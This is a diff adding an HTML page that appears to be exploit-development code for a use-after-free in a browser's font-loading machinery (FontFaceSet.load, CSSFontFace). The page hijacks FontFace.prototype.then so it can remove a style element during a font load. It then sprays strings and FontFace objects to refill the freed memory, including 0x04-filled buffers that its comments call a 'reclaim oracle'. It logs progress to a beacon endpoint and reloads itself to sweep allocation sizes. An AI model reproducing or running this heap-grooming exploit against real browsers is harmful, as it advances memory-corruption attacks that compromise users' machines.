@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>ffset substitution</title>
+</head>
+<body>
+<script>
+(function () {
+  var cfg = { mode: 'A', rm: 1, del: 0, n: 8, lens: '64,96,128,160,192,224,256', reps: 4, reload: 0, sweep: '', reps2: 6 };
+
+  function readCfg() {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', '/corpus/ffset-subst-config.json?t=' + Date.now(), false);
+      x.send(null);
+      if (x.status === 200) {
+        var o = JSON.parse(x.responseText);
+        for (var k in o) cfg[k] = o[k];
+      }
+    } catch (e) {}
+  }
+  readCfg();
+
+  function syncLog(tag, msg) {
+    var line = 'SUB ' + cfg.mode + ' rm=' + cfg.rm + ' del=' + cfg.del + ' n=' + cfg.n + ' ' + tag + ' ' + (msg || '');
+    try {
+      var x = new XMLHttpRequest();
+      x.open('POST', '/beacon/' + tag, false);
+      x.setRequestHeader('Content-Type', 'text/plain');
+      x.send(line + '\n');
+    } catch (e) {}
+  }
+
+  var hold = [];
+
+  function armStrings() {
+    var lens = String(cfg.lens).split(',');
+    var made = 0;
+    var host = document.createElement('div');
+    host.style.display = 'none';
+    document.body.appendChild(host);
+    for (var i = 0; i < lens.length; i++) {
+      var L = parseInt(lens[i], 10);
+      if (!(L > 0)) continue;
+      var s = new Array(L + 1).join('A');
+      for (var r = 0; r < cfg.reps; r++) {
+        var d = document.createElement('span');
+        d.setAttribute('data-pad', s);
+        d.textContent = s;
+        host.appendChild(d);
+        hold.push(d.getAttribute('data-pad'));
+        made++;
+      }
+    }
+    syncLog('STRINGS', 'made=' + made + ' lens=' + cfg.lens + ' reps=' + cfg.reps);
+  }
+
+  function armFaces() {
+    var made = 0;
+    for (var i = 0; i < cfg.n; i++) {
+      try {
+        var f = new FontFace('z' + i, 'url(/beacon/SUBST-' + i + ')');
+        hold.push(f);
+        made++;
+      } catch (e) {}
+    }
+    syncLog('FACES', 'made=' + made);
+  }
+
+  // mode D: strings filled with 0x04. CSSFontFace::pump() reads only the status
+  // byte first, and FontFaceSet::load() then only reads status() and
+  // sourceCount() (a member read) before rejecting with NetworkError. A byte
+  // value of 4 at the status offset therefore rejects the promise without a
+  // single pointer dereference, which is a reclaim oracle no CSSFontFace can
+  // produce on its own.
+  var sweepIndex = 0;
+  function sweepLens() {
+    var t = String(cfg.sweep || '').split(',');
+    var out = [];
+    for (var i = 0; i < t.length; i++) {
+      var v = parseInt(t[i], 10);
+      if (v > 0) out.push(v);
+    }
+    return out;
+  }
+  try { sweepIndex = parseInt(sessionStorage.getItem('subst_i') || '0', 10) || 0; } catch (e) { sweepIndex = 0; }
+
+  function armStatusStrings(list) {
+    // Every length in one arm: the first buffer whose size class matches the
+    // freed slot takes it, and every byte is 0x04, so the class that wins is
+    // recorded by the hit rather than by a separate page load per length.
+    // `createTextNode` allocates the StringImpl before the Text node, so the
+    // controlled buffer is the first allocation of its class in this loop.
+    var host = null;
+    var made = 0;
+    for (var i = 0; i < list.length; i++) {
+      var L = list[i];
+      var s = new Array(L + 1).join('\u0004');
+      for (var r = 0; r < cfg.reps2; r++) {
+        var t = document.createTextNode(s);
+        // Hold the node, which holds the string: a collected string would
+        // free its buffer and the slot would be back in the free list.
+        hold.push(t);
+        made++;
+      }
+    }
+    syncLog('STATUSSTR', 'lens=' + list.join(',') + ' n=' + made);
+  }
+
+  function run() {
+    syncLog('START', 'ua=' + navigator.userAgent);
+
+    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+    syncLog('ADD', 'fam=a');
+
+    var fired = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        if (fired) return undefined;
+        fired = true;
+        syncLog('ENTER', '');
+        if (cfg.rm) {
+          try {
+            var st = document.getElementById('victim-style');
+            if (st) { st.remove(); syncLog('REMOVED', 'style'); }
+          } catch (e) { syncLog('REMOVED', 'err ' + e); }
+        }
+        try { void document.body.offsetHeight; syncLog('LAYOUT', ''); } catch (e) { syncLog('LAYOUT', 'err ' + e); }
+        try {
+          if (cfg.mode === 'D') {
+            var ls = sweepLens();
+            if (ls.length) armStatusStrings(ls);
+          }
+          if (cfg.mode === 'C') armStrings();
+          if (cfg.mode === 'B' || cfg.mode === 'C') armFaces();
+        } catch (e) { syncLog('ARM', 'err ' + e); }
+        if (cfg.del) {
+          try { document.fonts.delete(this); syncLog('DELETED', 'face'); } catch (e) { syncLog('DELETED', 'err ' + e); }
+        }
+        syncLog('RETURN', 'hold=' + hold.length);
+        return undefined;
+      },
+      set: function () {}
+    });
+    syncLog('HOOK', 'then');
+
+    var st2 = document.createElement('style');
+    st2.id = 'victim-style';
+    st2.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
+    document.head.appendChild(st2);
+    syncLog('VICTIM', 'style injected');
+
+    try {
+      var p = document.fonts.load('1em a, x', 'AB');
+      p.then(function (faces) {
+        var fams = [];
+        for (var i = 0; i < faces.length; i++) fams.push(faces[i].family);
+        syncLog('RESOLVED', 'size=' + faces.length + ' fams=' + fams.join(','));
+      }, function (e) {
+        syncLog('REJECTED', String((e && e.message) || e));
+      });
+      syncLog('CALL', 'load returned');
+    } catch (e) {
+      syncLog('CALL', 'err ' + e);
+    }
+
+    syncLog('ALIVE', 'fonts=' + document.fonts.size + ' i=' + sweepIndex);
+    if (cfg.reload) {
+      setTimeout(function () {
+        if (cfg.mode === 'D') {
+          var ls = sweepLens();
+          try { sessionStorage.setItem('subst_i', String((sweepIndex + 1) % Math.max(1, ls.length))); } catch (e) {}
+        }
+        location.reload();
+      }, 700);
+    }
+  }
+
+  run();
+})();
+</script>
+</body>
+</html>
